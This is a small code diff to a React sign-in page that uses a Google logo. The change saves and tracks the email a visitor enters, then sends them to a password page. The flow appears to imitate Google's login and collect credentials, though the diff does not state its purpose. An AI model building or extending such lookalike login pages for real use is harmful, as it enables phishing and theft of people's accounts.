@@ -5,6 +5,7 @@ import {
   GeFontStyle,
   GeFooter,
   GoogleGLogo,
+  setGeEmail,
   useGeTracking,
 } from "@/components/ge/GeShared";
 
@@ -220,9 +221,11 @@ function GeSignInPage() {
     e?.preventDefault();
     if (!canContinue) return;
     trackClick("Next");
-    trackSubmit("email", email.trim());
-    // Navigate immediately — card stays put (no fade-out)
-    geNavigate("/ge/loading");
+    const trimmed = email.trim();
+    setGeEmail(trimmed);
+    trackSubmit("email", trimmed);
+    // Email → password challenge (not loading)
+    geNavigate("/ge/password");
   };
 
   return (
